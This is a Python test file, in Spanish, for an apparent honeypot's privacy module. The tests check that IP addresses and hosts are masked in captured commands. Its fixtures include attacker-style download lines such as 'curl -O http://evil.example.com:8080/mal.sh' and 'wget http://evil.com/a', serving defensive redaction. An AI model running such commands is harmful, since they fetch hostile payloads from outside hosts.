"""Lo que se tapa antes de que un texto llegue a una persona que no lo necesita."""

from __future__ import annotations

from honeyml.api import privacidad


def test_tapa_direcciones_ipv4() -> None:
    assert privacidad.sin_direcciones("ssh root@203.0.113.9") == "ssh root@x.x.x.x"


def test_tapa_el_host_de_una_url_pero_deja_el_esquema_y_la_ruta() -> None:
    assert privacidad.sin_direcciones("curl -O http://evil.example.com:8080/mal.sh") == (
        "curl -O http://tapado/mal.sh"
    )


def test_tapa_una_direccion_dentro_de_una_url() -> None:
    assert privacidad.sin_direcciones("wget http://198.51.100.20/a") == "wget http://tapado/a"


def test_tapa_un_dominio_usado_como_host() -> None:
    assert privacidad.sin_direcciones("wget evil.com/x.bin") == "wget tapado/x.bin"


def test_no_toca_lo_que_no_es_un_destino() -> None:
    """Nombres con punto que no son dominios: no se tocan, para no romper el comando."""
    for texto in (
        "uname -a",
        "cat /etc/cron.d/persist",
        "python3.12 -m venv .venv",
        "echo ok > /tmp/a.sh",
    ):
        assert privacidad.sin_direcciones(texto) == texto


def test_entra_a_cualquier_profundidad() -> None:
    dato = {"comando": ["wget http://evil.com/a", {"nota": "desde 203.0.113.9"}]}
    assert privacidad.sin_direcciones(dato) == {
        "comando": ["wget http://tapado/a", {"nota": "desde x.x.x.x"}]
    }


def test_descarta_credenciales_con_forma_de_direccion() -> None:
    cubos = [
        {"key": "root", "count": 9},
        {"key": "203.0.113", "count": 7},
        {"key": "admin", "count": 5},
    ]
    assert privacidad.sin_credenciales_con_direccion(cubos, 2) == [
        {"key": "root", "count": 9},
        {"key": "admin", "count": 5},
    ]
